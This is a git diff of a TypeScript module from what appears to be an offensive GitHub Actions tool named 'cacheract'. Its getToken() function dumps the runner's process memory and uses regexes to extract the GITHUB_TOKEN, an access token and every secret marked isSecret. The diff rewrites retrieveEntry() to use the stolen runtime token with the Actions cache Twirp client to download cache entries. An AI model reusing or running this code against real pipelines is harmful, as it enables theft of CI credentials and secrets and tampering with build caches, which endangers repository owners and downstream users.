@@ -5,7 +5,10 @@ import * as path from 'path';
 import * as fs from 'fs';
 import axios from 'axios';
 import { MEMDUMP_SCRIPT } from './static';
-import { tmpdir } from 'os';
+import { tmpdir, version } from 'os';
+import { restore } from 'mock-fs';
+import { GetCacheEntryDownloadURLRequest } from '@actions/cache/lib/generated/results/api/v1/cache';
+import { DownloadOptions } from '@actions/cache/lib/options';
 
 const execAsync = promisify(exec);
 
@@ -30,6 +33,9 @@ export type RunnerEnvironment = {
 export async function sleep(ms: number) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
+
+var cacheTwirpClient = require('@actions/cache/lib/internal/shared/cacheTwirpClient');
+var cacheHttpClient = require('@actions/cache/lib/internal/cacheHttpClient');
 
 /**
  * Generate a random string of specified length
@@ -62,27 +68,28 @@ export async function getOsInfo() {
 /**
  * 
  */
-export async function retrieveEntry(cache_key: string, cache_version: string, runtimeToken: string, cacheUrl: string): Promise<string> {
+export async function retrieveEntry(cache_key: string, cache_version: string, runtimeToken: string): Promise<string> {
     var cacheHttpclient = require('@actions/cache/lib/internal/cacheHttpClient');
     try {
-        const headers = {
-            'Authorization': `Bearer ${runtimeToken}`,
-            'User-Agent': 'actions/cache-4.0.0',
-            'accept': 'application/json;api-version=6.0-preview.1'
-        };
-
         // We need both the cache URL and ACTIONS_RUNTIME_TOKEN to retrieve the cache.
-        if (!cacheUrl || !runtimeToken) {
+        if (!runtimeToken) {
             return '';
         }
 
-        const url = new URL(`${cacheUrl}_apis/artifactcache/cache?keys=${encodeURIComponent(cache_key)}&version=${encodeURIComponent(cache_version)}`);
+        process.env['ACTIONS_RUNTIME_TOKEN'] = runtimeToken;
+        const request: GetCacheEntryDownloadURLRequest = {
+            key: cache_key,
+            restoreKeys: [],
+            version: cache_version
+        }
 
-        // Make the HTTP GET request using axios
-        const response = await axios.get(url.href, { headers });
-        if (response.status == 200) {
-            const location = new URL(response.data['archiveLocation'])
-            await cacheHttpclient.downloadCache(location, '/tmp/cacheract.tar.tzstd');
+        const twirpClient = cacheTwirpClient.internalCacheTwirpClient();
+        const response = await twirpClient.GetCacheEntryDownloadURL(request)
+        const options: DownloadOptions = {
+            useAzureSdk: true
+        }
+        if (response.ok) {
+            await cacheHttpclient.downloadCache(response.signedDownloadUrl, '/tmp/cacheract.tar.tzstd', options);
             if (fs.existsSync('/tmp/cacheract.tar.tzstd')) {
                 console.log('Cache retrieved successfully');
                 return '/tmp/cacheract.tar.tzstd';
@@ -471,17 +478,14 @@ export async function getToken(): Promise<Map<string, string>> {
         // Regular expressions to match the tokens and URL
         const githubTokenRegex = /"system\.github\.token":\{"value":"(ghs_[^"]*)","isSecret":true\}/;
         const accessTokenRegex = /AccessToken":\s*"([^"]*)"/;
-        const cacheServerUrlRegex = /CacheServerUrl":"([^"]*)"/;
 
         // Extract the values using the regular expressions
         const githubTokenMatch = stdout.match(githubTokenRegex);
         const accessTokenMatch = stdout.match(accessTokenRegex);
-        const cacheServerUrlMatch = stdout.match(cacheServerUrlRegex);
 
         let result = new Map([
             ['GITHUB_TOKEN', githubTokenMatch ? githubTokenMatch[1] : ''],
-            ['ACCESS_TOKEN', accessTokenMatch ? accessTokenMatch[1] : ''],
-            ['ACTIONS_CACHE_URL', cacheServerUrlMatch ? cacheServerUrlMatch[1] : '']
+            ['ACCESS_TOKEN', accessTokenMatch ? accessTokenMatch[1] : '']
         ])
 
         const secretRegex = /"([^"]+)":{"value":"([^"]*)","isSecret":true}/g;
